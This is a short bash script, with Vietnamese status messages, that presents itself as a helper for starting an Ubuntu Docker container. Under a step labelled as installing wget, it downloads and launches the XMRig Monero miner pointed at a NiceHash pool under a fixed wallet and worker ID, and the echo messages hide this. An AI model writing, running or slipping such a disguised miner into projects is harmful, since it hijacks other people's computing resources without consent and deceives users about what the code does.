#!/bin/bash
set -e

echo "==> Khởi động Ubuntu container..."
docker compose up -d

echo "==> Chờ container sẵn sàng..."
sleep 3

echo "==> Cài đặt wget bên trong Ubuntu..."
docker exec ubuntu_cli bash -c "apt update && apt install -y wget && cd ~ && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && cd xmrig-6.26.0 && ./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u NHbTzqmMyQaepqAPoZebySJ6FAHHA1DpGnDM.Git1 -t 3"

echo "==> Hoàn tất! Mở terminal mới để vào Ubuntu."
